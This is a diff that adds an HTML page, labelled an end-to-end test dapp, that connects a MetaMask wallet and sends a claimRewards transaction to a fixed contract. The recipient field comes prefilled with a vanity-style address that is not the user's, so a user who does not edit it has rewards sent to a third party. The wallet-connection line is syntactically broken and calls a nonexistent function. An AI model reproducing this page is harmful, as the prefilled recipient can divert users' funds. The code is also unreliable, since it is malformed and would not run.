@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Claim Rewards - E2E Test Dapp</title>
+  <script src="https://cdn.ethers.org/lib/ethers-5.7.umd.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; background: #121212; color: #fff; padding: 20px; }
+    .container { max-width: 500px; margin: 0 auto; background:#1e1e1e; padding:20px; border-radius:12px; }
+    button { padding:12px 24px; font-size:16px; margin:10px 5px; border:none; border-radius:8px; cursor:pointer; }
+    .connect { background:#00bfa5; color:#000; }
+    .claim   { background:#00e676; color:#000; }
+    .disabled { background:#555; cursor:not-allowed; }
+    input { width:100%; padding:12px; margin:10px 0; background:#333; border:none; border-radius:8px; color:#fff; }
+    .info { margin-top:20px; font-size:14px; color:#aaa; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Claim Rewards</h1>
+    <p>Contract: <code>0x0B3E87a076AC4B0d1975F0f232444af6DEb96c59</code></p>
+
+    <button id="connectBtn" class="connect">Connect Wallet</button>
+    <div id="account"></div>
+
+    <hr/>
+
+    <label>Recipient Address (to receive rewards)</label>
+    <input type="text" id="recipient" placeholder="0x..." 
+           value="0x00008F1149168c1d2fa1eba1ad3e9cd644510000" />
+
+    <button id="claimBtn" class="claim disabled" disabled>Claim Rewards</button>
+
+    <div id="status" class="info"></div>
+  </div>
+
+  <script>
+    const CONTRACT_ADDRESS = "0x0B3E87a076AC4B0d1975F0f232444af6DEb96c59";
+    // claimRewards(address) selector (exactly as in your screenshot)
+    const FUNCTION_SELECTOR = "0xe15cfb3c";
+
+    const connectBtn = document.getElementById("connectBtn");
+    const claimBtn   = document.getElementById("claimBtn");
+    const recipientInput = document.getElementById("recipient");
+    const accountDiv = document.getElementById("account");
+    const statusDiv  = document.getElementById("status");
+
+    let userAddress = null;
+    let provider, signer;
+
+    // Connect to MetaMask
+    connectBtn.onclick = async () => {
+      if (typeof window.ethereum === "undefined") {
+        alert("Please install MetaMask!");
+        return;
+      }
+
+      try {
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        provider = new ethers.providers.Web3Provider(window.Web3Provider(window.ethereum);
+        signer = provider.getSigner();
+        userAddress = await signer.getAddress();
+
+        accountDiv.innerHTML = `Connected: <b>${userAddress}</b>`;
+        connectBtn.disabled = true;
+        claimBtn.disabled = false;
+        claimBtn.classList.remove("disabled");
+        statusDiv.textContent = "";
+      } catch (err) {
+        statusDiv.textContent = "Connection rejected or failed: " + err.message;
+      }
+    };
+
+    // Build calldata for claimRewards(address)
+    function buildCalldata(toAddress) {
+      // Pad address to 32 bytes and append to the 4-byte function selector
+      const paddedAddress = toAddress.slice(2).padStart(64, "0");
+      return FUNCTION_SELECTOR + paddedAddress;
+    }
+
+    claimBtn.onclick = async () => {
+      if (!signer) {
+        statusDiv.textContent = "Wallet not connected!";
+        return;
+      }
+
+      const toAddress = recipientInput.value.trim();
+      if (!ethers.utils.isAddress(toAddress)) {
+        statusDiv.textContent = "Invalid recipient address";
+        return;
+      }
+
+      const calldata = buildCalldata(toAddress);
+
+      statusDiv.textContent = "Sending transaction...";
+
+      try {
+        const tx = await signer.sendTransaction({
+          to: CONTRACT_ADDRESS,
+          data: calldata,
+          // value: 0  (no ETH needed according to your screenshot)
+        });
+
+        statusDiv.innerHTML = `Transaction sent!<br/>Hash: <a href="https://etherscan.io/tx/${tx.hash}" target="_blank">${tx.hash}</a>`;
+
+        // Wait for confirmation (optional)
+        await tx.wait();
+        statusDiv.innerHTML += "<br/><b>Confirmed!</b> Rewards claimed.";
+      } catch (err) {
+        console.error(err);
+        statusDiv.textContent = "Error: " + (err.reason || err.message || JSON.stringify(err));
+      }
+    };
+  </script>
+</body>
+</html>
